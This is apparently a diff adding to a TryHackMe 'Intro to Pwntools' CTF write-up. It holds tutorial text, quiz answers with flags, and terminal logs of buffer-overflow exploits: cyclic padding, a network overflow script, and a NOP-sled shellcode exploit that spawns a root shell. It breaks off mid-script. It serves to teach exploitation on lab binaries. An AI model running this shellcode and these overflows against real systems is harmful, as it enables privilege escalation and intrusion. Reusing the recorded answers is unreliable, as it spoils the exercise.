@@ -508,3 +508,513 @@ buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ./intro2pwn3 < attack
 I run as dizmas.
 Who are you?: Getting Flag:
 flag{13@rning_2_pwn!}
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat attack 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa6�
+
+I'm doing on my own
+
+┌──(witty㉿kali)-[~/buffer_overflow]
+└─$ sudo apt-get install virtualenv
+──(witty㉿kali)-[~/buffer_overflow]
+└─$ virtualenv -p /usr/bin/python2.7 env-py2
+──(witty㉿kali)-[~/buffer_overflow]
+└─$ ls
+attack  env-py2  pwn_cyclic.py
+┌──(witty㉿kali)-[~/buffer_overflow]
+└─$ source env-py2/bin/activate
+┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ pip install pwntools
+┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ python2 -m pip install --upgrade pip==20.3.4
+┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ python2 -m pip install --upgrade pwntools
+┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ pip install pathlib2
+┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ cat pwn_cyclic.py
+from pwn import *
+
+padding = cyclic(cyclic_find('jaaa'))
+
+eip = p32(0x8048536)
+
+payload = padding + eip
+
+print(payload)
+──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ python pwn_cyclic.py > attack
+┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ cat attack       
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa6�
+──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ python3 -m http.server 1337  
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.5.139 - - [17/Feb/2023 18:59:21] "GET /attack HTTP/1.1" 200
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ rm attack
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
+alphabet  flag.txt  intro2pwn3  pattern  pwn_cyclic.py  test_cyclic.c
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls -lah
+total 40K
+drwxrwxr-x 2 buzz   buzz   4.0K Feb 17 23:58 .
+drwxrwxr-x 6 buzz   buzz   4.0K May 19  2021 ..
+-rw-rw-r-- 1 buzz   buzz    105 May 19  2021 alphabet
+-r--r----- 1 dizmas dizmas   22 May 19  2021 flag.txt
+-rw------- 1 buzz   buzz    180 Feb 17 22:33 .gdb_history
+-rwsrwxr-x 1 dizmas dizmas 7.3K May 19  2021 intro2pwn3
+-rw-rw-r-- 1 buzz   buzz    100 Feb 17 22:21 pattern
+-rw-rw-r-- 1 buzz   buzz    120 Feb 17 22:34 pwn_cyclic.py
+-rw-rw-r-- 1 buzz   buzz    359 Jun 10  2021 test_cyclic.c
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ wget http://10.8.19.103:1337/attack
+--  http://10.8.19.103:1337/attack
+Connecting to 10.8.19.103:1337... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 41 [application/octet-stream]
+Saving to: ‘attack’
+
+attack                   100%[==================================>]      41  --.-KB/s    in 0s      
+
+(3.23 MB/s) - ‘attack’ saved [41/41]
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat attack
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa6�
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ./intro2pwn3 < attack
+I run as dizmas.
+Who are you?: Getting Flag:
+flag{13@rning_2_pwn!}
+
+:)
+```
+Which user owns both the flag.txt and intro2pwn3 file?
+*dizmas*
+Use checksec on intro2pwn3. What bird-themed protection is missing?
+What is the name of the token that detects an overflow?
+*canary*
+What ascii letter sequence is 0x4a4a4a4a (pwndbg should tell you).
+You can also use a hex to ascii converter.
+*JJJJ*
+What is the output of "cyclic 12"?
+*aaaabaaacaaa*
+What pattern, in hex, was the eip overflowed with?
+Format: 0x******** ; What is 'jaaa' in hex (little endian)?
+*0x6161616a*
+I have overflowed the eip with 0xdeadbeef
+Completed
+What is the flag?
+### Networking
+﻿When you are ready to move on, please enter the networking directory. Inside, you will find a note, an executable, and more c code. In the last challenge, we manually inputted our exploit, although pwntools give us the ability send and receive data automatically. This can work both locally and over a networking port. For this challenge, we will use the networking tools, and in the next challenge, we will use the local tools.
+**Unpacking the code**
+The note tells us what port is serving our flag. Please answer question 1.
+If you netcat that port, it was say "Give me deadbeef: " and prompt until the connection is closed (please note, each time the connection is closed, the service will close until the cron restarts it each minute). To test out exploit, we can run our own version on port 1336. We can use tmux or use a second ssh session to have two interfaces, one to run the service, and one to develop out exploit.
+The code for this challenge is more involved that the previous challenges. I have used the following code, and edited it for my own purpose: [https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/](https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/). For this challenge, we do not need to concern ourselves with main(), but only the target_function(). The struct at the beginning of the function, called targets, has two variables: buff and printflag. The buff is a char array of size MAX (MAX was defined to 32), and the printflag is a volatile int. These variables will be right next to each other in the stack, so if we manage to overflow the buff variable, then we can edit the printflag. If you see further down in the code, if the printflag variable is equal to 0xdeadbeef (in hex) then it will send the flag. Please answer question 2.
+**Networking to the flag**
+We will need to write a script to connect to the port, receive the data, and send our payload. To connect to a port in Pwntools, use the remote() function in the format of: remote(IP, port).
+`from pwn import *`
+`connect = remote('127.0.0.1', 1336)`
+We can receive data with either the recvn(bytes) or recvline() functions. The recvn() receives as many bytes as specified, while the recvline() will receive data until there is a newline. Our code does not send a newline, so we will have to use recvn(). In our test_networking.c code, the "Give me deadbeef: " is 18 bytes, so we will receive 18 bytes.
+`print(connect.recvn(18))`
+We have to send enough data to overflow the buff variable, and write to the printflag. the buff is a 32 byte array, so we can write some character 32 times to overflow buff, and then write our 0xdeadbeef to printflag.
+`payload = "A"*32`
+`payload += p32(0xdeadbeef)`
+We can send the payload with the send() function.
+`connect.send(payload)`
+To receive our flag, We can just use connect.recvn() again. According to the c code, the flag will be 34 bytes long.
+`print(connect.recvn(34))`
+Run this against your server at 1336 and make sure it works. Once you have, change the port to the answer to question 1 to receive the flag!
+Answer the questions below
+
+## Exploitation
+```text
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools$ cd networking/
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ ls
+note_to_buzz.txt  serve_test  test_networking.c
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat test_networking.c 
+//Networking C code from:
+// https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/
+
+#include <stdio.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#define MAX 32
+#define PORT 1336
+#define SA struct sockaddr
+  
+// function which handles input and output over the socket
+void target_function(int sockfd)
+{
+    struct {
+    	char buff[MAX];
+    	volatile int printflag;
+    } targets;
+
+    for (;;) {
+        bzero(targets.buff, MAX);
+  	
+	write(sockfd, "Give me deadbeef: ", 18);
+
+        targets.printflag = 0;
+        read(sockfd, targets.buff, 100);
+        
+        printf("From client: %s\t ", targets.buff);
+        bzero(targets.buff, MAX);
+  
+  
+        if (targets.printflag == 0xdeadbeef) {
+            write(sockfd, "Thank you!\nflag{*****************}", 34);
+            break;
+	}
+	else if (targets.printflag != 0) {
+	    write(sockfd, "Buffer Overflow, but not with 0xdeadbeef", 40);
+            break;	
+        }
+    }
+}
+  
+
+int main()
+{
+    int sockfd, connfd, len;
+    struct sockaddr_in servaddr, cli;
+  
+    
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+        printf("socket creation failed...\n");
+        exit(0);
+    }
+    else
+        printf("Socket successfully created..\n");
+    bzero(&servaddr, sizeof(servaddr));
+  
+    // assign IP, PORT
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    servaddr.sin_port = htons(PORT);
+  
+    // Binding newly created socket to given IP and verification
+    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
+        printf("socket bind failed...\n");
+        exit(0);
+    }
+    else
+        printf("Socket successfully binded..\n");
+  
+    // Now server is ready to listen and verification
+    if ((listen(sockfd, 5)) != 0) {
+        printf("Listen failed...\n");
+        exit(0);
+    }
+    else
+        printf("Server listening..\n");
+    len = sizeof(cli);
+  
+    // Accept the data packet from client and verification
+    connfd = accept(sockfd, (SA*)&cli, &len);
+    if (connfd < 0) {
+        printf("server acccept failed...\n");
+        exit(0);
+    }
+    else
+        printf("server acccept the client...\n");
+  
+    // target function handles input and output
+    target_function(connfd);
+  
+    // After chatting close the socket
+    close(sockfd);
+}
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat note_to_buzz.txt 
+Dear buzz,
+
+I'm running a service on port 1337, which has an overflow vulnerability.
+I've left you a version that will run on port 1336 so that you can develop
+your exploit. 
+
+Sincerely,
+dizmas
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ nc 10.10.5.139 1337
+Give me deadbeef: lallalallala
+Give me deadbeef: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ checksec serve_test 
+[*] '/home/buzz/IntroToPwntools/IntroToPwntools/networking/serve_test'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
+└─$ cat network.py 
+from pwn import *
+connect = remote('127.0.0.1', 1336)
+print(connect.recvn(18))
+payload = "A"*32
+payload += p32(0xdeadbeef)
+connect.send(payload)
+print(connect.recvn(34))
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ nc -lvnp 1336
+Listening on [0.0.0.0] (family 0, port 1336)
+Connection from 127.0.0.1 46476 received!
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ python network.py 
+[+] Opening connection to 127.0.0.1 on port 1336: Done
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat network.py 
+from pwn import *
+connect = remote('10.10.5.139', 1337)
+print(connect.recvn(18))
+payload = "A"*32
+payload += p32(0xdeadbeef)
+connect.send(payload)
+print(connect.recvn(34))
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ python network.py 
+[+] Opening connection to 10.10.5.139 on port 1337: Done
+Give me deadbeef: 
+Thank you!
+flag{n3tw0rk!ng_!$_fun}
+[*] Closed connection to 10.10.5.139 port 1337
+```
+What port is serving our challenge?
+*1337*
+Please use checksec on serve_test. Is there a stack canary? (Y or N)
+Even if there is a canary on the binary, both variables are within the stack, so the overflow will still work.
+*Y*
+I have run my exploit against my own server on port 1336
+Completed
+What is the flag?
+### Shellcraft
+It is time for our final challenge! Please navigate to the shellcraft directory. Inside, you will find four files: a note, a bash script, the executable, and the c code. If you read the note, you will see that you need to disable ASLR, which stands for address space layout randomization. This randomizes where in memory the executable is loaded each time it is run. Like PIE, it makes attacks that rely on memory layout more difficult. Please answer question 1.
+Please read the note and disable ASLR.
+**Root of the Issue:**
+Have you ever run an exploit on a machine to escalate privileges, and wondered how it works? Today, we are going to develop our own exploit to root this box! Some programs and services, such as sudo, need to run as root for the system to work properly, and when a vulnerability is discovered in one of these programs, an easy path to a root shell is opened. Please answer question 2.
+You may have heard of the [heap buffer overflow vulnerability in sudo](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156) which allowed for quick privilege escalation. The exploit, discovered in 2021, has its own [room on TryHackMe](https://tryhackme.com/room/sudovulnssamedit) if you are interested in learning more about it.
+**Shell in the Haystack:**
+If we view the code for our executable, we see there is not much, just a call of gets(). If we remember from our cyclic task, gets() is vulnerable to buffer overflow, but this time, there is no print_flag() to jump to. When we control the eip, where should we jump to? Although there does not seem to be any useful instructions inside our code, what if we wrote our own instructions? Our variables are stored in memory, just like the program itself, so if we write instructions in our variable, and direct the eip to it, we can make the program follow our own instructions! This injected code is called shellcode, because it is traditionally (but not always) used to spawn a shell. If you recall, our variables are stored in the stack, so if we direct the eip to the stack, we will direct it to our shellcode. Please answer question 3.
+Let's get control of that eip! Please find the location of the eip, like we did in the cyclic task. Please answer question 4.
+I would recommend filling the eip with 0xdeadbeef like we did before.
+Once we control the eip, we need to direct it to the stack where we can place our own code. The top of the stack is pointed to by the SP (or stack pointer) which is called esp in 32-bit machines. For me, the esp is located at 0xffffd510, and you can check the location of yours in gdb. If we want to jump to our shellcode, we want to jump to the middle of the stack (rather than the top where the SP points), so we usually add an offset to the esp location in your exploit. I use an offset of 200, because that's what ended up working for me. In other challenges, you may only need an offset of 8 or 16. I have found that choosing the right offset is a matter of trial and error.
+`from pwn import *`
+`padding = cyclic(cyclic_find('answer_to_question_4'))`
+`eip = p32(0xffffd510+200)`
+You may be wondering how we are going to point the eip to our shellcode (rather than other data in the stack), and the answer is to make our variable into a big landing spot. There is an instruction in assembly called no-operation (or NOP), which is 0x90 in hex, and the NOP is a space holder that passes the eip to the next space in memory. If we make a giant "landing pad" of NOPs, and direct the eip towards the middle of the stack, odds are that the eip will land on our NOP pad, and the NOPs will pass the eip down to eventually hit our shellcode. This is often called a NOP slide (or sled), because the eip will land in the NOPs and slide down to the shellcode. In my case, a NOP sled of 1000 worked, but other challenges may require different sizes. When writing a raw hex byte in python, we use the format "\x00", so we can write "\x90" for a NOP.
+`nop_slide = "\x90"*1000`
+Before we write our shellcode, we can inject a breakpoint at the end of our NOP slide to make sure the slide works. The breakpoint instruction in hex is "0xcc", and so we can add the following to our code:
+`shellcode = "\xcc"`
+Our payload should be as follows:
+`payload = padding + eip + nop_slide + shellcode`
+Please direct the output of this file to a text file.
+if we input the text file to intro2pwnFinal, we should hit a breakpoint. Please answer question 5.
+Great, we can inject our own code into the program! Of course, we want to do more than hit a breakpoint, we want to spawn a root shell. That means we need to write some shellcode. While some crazy people like to write shellcode from scratch, pwntools gives us a great utility to cook up shellcode: shellcraft. If you have ever used msfvenom, shellcraft is a similar tool. Like cyclic, shellcraft can be used in the command line and inside python code. I like to use the command line, and copy and paste the shellcode over to my exploit script. The command line command for shellcraft is: shellcraft arch.OS.command, such as:
+`shellcraft i386.linux.sh`
+This is for a basic bash shell for Linux executables with i386 architecture. A neat feature of shellcraft is that we can print out the shellcode in different formats with the -f flag. The possible formats are listed if you enter the shellcraft -h command. Please answer question 6.
+There is a bit of a snag in the above shellcode. In order to get a root shell, we need to keep the privileges of intro2pwnFinal, although bash will drop the privileges unless we add the -p flag. If we observe the assembly code for this shell, we see that it uses execve and passes /bin///sh as the first parameter and ['sh'] as the second. The first parameter is the path to what we want to execute, and the second parameter is the argv array, which contains the command line arguments (If you are confused about execve, you can refer to this man page [here](https://man7.org/linux/man-pages/man2/execve.2.html)).  In this case, we want to execute /bin///sh, but we want to pass 'sh' and '-p' into the argv array. We can use shellcraft to create execve shellcode with"/bin///sh" and "['sh', '-p']" as parameters. We can do this with the following command:
+`shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a`
+When we run this command, we see it is the same as the linux.sh shellcode, except the added '-p' to the argv array. To write shellcode that is easier to use in our python exploit script, we can replace the "-f a" with "-f s", which will print our shellcode in string format. We can copy that and paste it into our exploit code (replacing the breakpoint instruction):
+`shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"`
+Our code is almost done! Until this point, we have been printing our payload and manually inputting it into the executable. Like in the networking task, Pwntools allows us to interact with the program automatically. For a local process, we use the process() function.
+`proc = process('./intro2pwnFinal')`
+We can receive data from the process, and since the process sends data with a new line, we can use recvline(), rather than recvn().
+`proc.recvline()`
+After we have crafted our payload, we can send it with:
+`proc.send(payload)`
+Finally, after we have sent the payload, we need a way to communicate with the shell we have just spawned. We can do with with
+`proc.interactive()`
+So, to recap, our whole python script is:
+`from pwn import *`
+`proc = process('./intro2pwnFinal')`
+`proc.recvline()   `
+`padding = cyclic(cyclic_find('taaa'))`
+`eip = p32(0xffffd510+200)`
+`nop_slide = "\x90"*1000   `
+`shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"`
+`payload = padding + eip + nop_slide + shellcode`
+`proc.send(payload)`
+`proc.interactive()`
+Alright, that was a lot! Take a deep breath and run our python code. If we did this right, we should get an interactive shell. The first command may not register, but the second one should work. If you received an "Got EOF while reading in interactive", then you have an error, and will need to troubleshoot. The people at the THM discord are [helpful](https://discord.com/channels/521382216299839518/522158539129618453), and I hang out there frequently myself. Please answer question 7.
+Congratulations, you have a root shell! You will find the flag in the /root directory.
+Answer the questions below
+```text
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cd ../shellcraft/
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ ls
+disable_aslr.sh  intro2pwnFinal  note_to_buzz_2.txt  test_shellcraft.c
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat note_to_buzz_2.txt 
+Dear buzz,
+
+For this last pwntools challenge, you will need to disable ASLR.
+I have provided a script for you to do so, which you can run as 
+sudo without a password. Just run:
+
+sudo ./disable_aslr.sh
+
+Good luck!
+
+Sincerely,
+dizmas
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat test_shellcraft.c 
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void start(){
+	char input[64];
+	gets(input);
+}
+
+int main(){
+	printf("Hello There. Do you have an input for me?\n");
+	start();
+
+}
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ ls -l
+total 20
+-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 disable_aslr.sh
+-rwsrwxr-x 1 root   root   7236 May 19  2021 intro2pwnFinal
+-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
+-rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ checksec intro2pwnFinal
+[*] '/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ sudo ./disable_aslr.sh
+0
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cyclic 100 > pattern
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb intro2pwnFinal 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from intro2pwnFinal...(no debugging symbols found)...done.
+pwndbg> r < pattern
+Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < pattern
+Hello There. Do you have an input for me?
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616174 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
+ EAX  0xffffd4c0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+ EBX  0x61616172 ('raaa')
+ ECX  0xf7fc15c0 (_IO_2_1_stdin_) ◂— cwde    /* 0xfbad2098 */
+ EDX  0xf7fc289c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0x0
+ ESI  0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
+ EBP  0x61616173 ('saaa')
+ ESP  0xffffd510 ◂— 'uaaavaaawaaaxaaayaaa'
+ EIP  0x61616174 ('taaa')
+─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
+Invalid address 0x61616174
+
+─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
+00:0000│ esp 0xffffd510 ◂— 'uaaavaaawaaaxaaayaaa'
+01:0004│     0xffffd514 ◂— 'vaaawaaaxaaayaaa'
+02:0008│     0xffffd518 ◂— 'waaaxaaayaaa'
+03:000c│     0xffffd51c ◂— 'xaaayaaa'
+04:0010│     0xffffd520 ◂— 'yaaa'
+05:0014│     0xffffd524 —▸ 0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
+06:0018│     0xffffd528 ◂— 0x0
+07:001c│     0xffffd52c —▸ 0xf7e01f21 (__libc_start_main+241) ◂— add    esp, 0x10
+───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
+ ► f 0 0x61616174
+   f 1 0x61616175
+   f 2 0x61616176
+   f 3 0x61616177
+   f 4 0x61616178
+   f 5 0x61616179
+─────────────────────
+pwndbg> quit
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ nano shellcraft.py
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat shellcraft.py 
+from pwn import *
+padding = cyclic(cyclic_find('taaa'))
+
+eip = p32(0xdeadbeef)
+
+payload = padding + eip
+
+print(payload)
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ python shellcraft.py > attack
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb intro2pwnFinal 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from intro2pwnFinal...(no debugging symbols found)...done.
+pwndbg> r < attack
+Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < attack
+Hello There. Do you have an input for me?
+
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
+ EAX  0xffffd4c0 ◂— 0x61616161 ('aaaa')
+ EBX  0x61616172 ('raaa')
+ ECX  0xf7fc15c0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
+ EDX  0xf7fc289c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0x0
+ ESI  0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
+ EBP  0x61616173 ('saaa')
+ ESP  0xffffd510 —▸ 0xffffd500 ◂— 0x61616171 ('qaaa')
+ EIP  0xdeadbeef
+─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
+Invalid address 0xdeadbeef
+
+─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
+00:0000│ esp 0xffffd510 —▸ 0xffffd500 ◂— 0x61616171 ('qaaa')
+01:0004│     0xffffd514 ◂— 0x0
+02:0008│     0xffffd518 ◂— 0x0
+03:000c│     0xffffd51c —▸ 0xf7e01f21 (__libc_start_main+241) ◂— add    esp, 0x10
+04:0010│     0xffffd520 —▸ 0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
+05:0014│     0xffffd524 —▸ 0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
+06:0018│     0xffffd528 ◂— 0x0
+07:001c│     0xffffd52c —▸ 0xf7e01f21 (__libc_start_main+241) ◂— add    esp, 0x10
+───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
+ ► f 0 0xdeadbeef
+─────────────────
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat shellcraft.py 
+from pwn import *
+
+padding = cyclic(cyclic_find('taaa'))
